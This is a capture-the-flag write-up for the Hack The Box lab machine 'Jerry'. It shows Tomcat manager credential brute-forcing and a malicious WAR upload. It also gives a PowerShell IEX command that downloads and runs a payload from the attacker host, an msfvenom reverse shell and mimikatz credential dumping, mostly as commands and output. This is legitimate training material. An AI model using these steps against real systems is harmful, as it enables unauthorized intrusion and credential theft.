# Hackthebox Jerry


Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.


## Recon

First, as always, we perform our initial enumeration of the box using Nmap.

```
# Nmap 7.70 scan initiated Sun Nov 18 21:32:47 2018 as: nmap -v -sV -p- -oA jerry_tcp_full 10.10.10.95
Nmap scan report for 10.10.10.95
Host is up (0.033s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```
So we only have one service to focus on. It seems to be an Apache Tomcat server.

Visiting the page we see that it is indeed Tomcat. We see the version number Apache Tomcat/7.0.88 printed on the page. 

The first thing i usually check with Tomcat is if we can access the Tomcat manager.

Browsing to http://10.10.10.95:8080/manager we are promted with a login. 


Okay so lets try some simple usernames and passwords like admin:admin etc. No luck there.

Tomcat has some default credential combinations we can try. This page has a good summary of these: https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown.

Metasploit also have some wordlists with these as well.


## Initial Compromise

Let's try these default credentials against the server.

```
msf auxiliary(scanner/http/tomcat_mgr_login) > run

[-] 10.10.10.95:8080 - LOGIN FAILED: j2deployer:j2deployer (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: ovwebusr:OvW*busr1 (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: cxsdk:kdsxc (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: root:owaspbwa (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: ADMIN:ADMIN (Incorrect)
[-] 10.10.10.95:8080 - LOGIN FAILED: xampp:xampp (Incorrect)
[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Bingo tomcat:s3cret got us logged in.

We can also use Hydra to brute-force the login:

```
root@kali:~/htb/jerry# hydra -L tomcat_user.txt -P tomcat_passwords.txt -s 8080 10.10.10.95 http-get /manager/html
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-11-18 22:53:12
[DATA] max 16 tasks per 1 server, overall 16 tasks, 77 login tries (l:7/p:11), ~5 tries per task
[DATA] attacking http-get://10.10.10.95:8080//manager/html
[8080][http-get] host: 10.10.10.95   login: admin   password: admin
[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
1 of 1 target successfully completed, 2 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-11-18 22:53:15
```

The first hit (admin:admin) is a false positive. I have not digged any deeper to figure out why.

Once we are logged in to Tomcat we can upload a .war file containing a shell to get code execution on the server. 

If we are lazy, we can use Metasploit to do this for us:

```
msf exploit(multi/http/tomcat_mgr_upload) > exploit 

[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying DUDlNsQtDVKT3jF...
[*] Executing DUDlNsQtDVKT3jF...
[*] Undeploying DUDlNsQtDVKT3jF ...
[*] Sending stage (53845 bytes) to 10.10.10.95
[*] Meterpreter session 1 opened (10.10.14.17:4444 -> 10.10.10.95:49192) at 2018-11-18 22:03:44 +0100

meterpreter > sysinfo
Computer    : JERRY
OS          : Windows Server 2012 R2 6.3 (amd64)
Meterpreter : java/windows
meterpreter > getuid
Server username: JERRY$
```


## Establish Foothold

The first thing I usually do when I have an initial foothold on a system is to upgrade our shell. This is because some tasks and exploits during our privesc phase may require a full TTY to work. Trust me, I have learned this the hard way.

Our Meterpreter shell is a Java shell that is not really stable. So let's get a proper shell on the system.

Create a powershell payload with Unicorn:

```
root@kali:~/tools/post-exploitation/unicorn# python unicorn.py windows/meterpreter/reverse_http 10.10.14.17 4444                                                                                            
```

Request and run the payload with powershell:

```
c:\apache-tomcat-7.0.88>powershell.exe -c "IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.17:8000/powershell_attack.txt')"                                                                   
powershell.exe -c "IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.17:8000/powershell_attack.txt')"                                                                                           

[*] http://10.10.14.17:4444 handling request from 10.10.10.95; (UUID: cs2csgfu) Encoded stage with x86/shikata_ga_nai                                                                                       
[*] http://10.10.14.17:4444 handling request from 10.10.10.95; (UUID: cs2csgfu) Staging x86 payload (180854 bytes) ...                                                                                      
[*] Meterpreter session 3 opened (10.10.14.17:4444 -> 10.10.10.95:49194) at 2018-11-18 22:19:02 +0100


meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo 
Computer        : JERRY
OS              : Windows 2012 R2 (Build 9600).
Architecture    : x64
System Language : en_US
Domain          : HTB
Logged On Users : 0
Meterpreter     : x86/windows
```

Our newly spawned meterpreter is running in a SYSTEM context. Well thats that. 

Let's for the fun of it see of we can dump some credentials of the host using kiwi.

We are on a 64-bit system, so first we need to upgrade our 32-bit meterpreter to 64-bit. 

List all processes with ps.

Migrating to lsass.exe is usually pretty stable

```
meterpreter > migrate 464
[*] Migrating from 4036 to 464...
[*] Migration completed successfully.
meterpreter > load kiwi 
Loading extension kiwi...
  .#####.   mimikatz 2.1.1 20180925 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > creds_all 
[+] Running as SYSTEM
[*] Retrieving all credentials
wdigest credentials
===================

Username  Domain  Password
--------  ------  --------
(null)    (null)  (null)
JERRY$    HTB     (null)

kerberos credentials
====================

Username  Domain  Password
--------  ------  --------
(null)    (null)  (null)
jerry$    HTB     (null)

```

Okej nothing really interesting there.


### Manual way

Let's get RCE without using Metasploit here.

Creating a JSP payload with msfveom:

```
root@kali:~/htb/jerry# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.17 -f war > shell.war
Payload size: 1100 bytes
Final size of war file: 1100 bytes
```

Then we need to upload it in the application. Under the headline "WAR file to deploy" in the tomcat manager, we can upload our payload.

```
root@kali:~/htb/jerry# nc -lvp 4444
listening on [any] 4444 ...
10.10.10.95: inverse host lookup failed: Unknown host
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.95] 49193
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

C:\apache-tomcat-7.0.88>
```
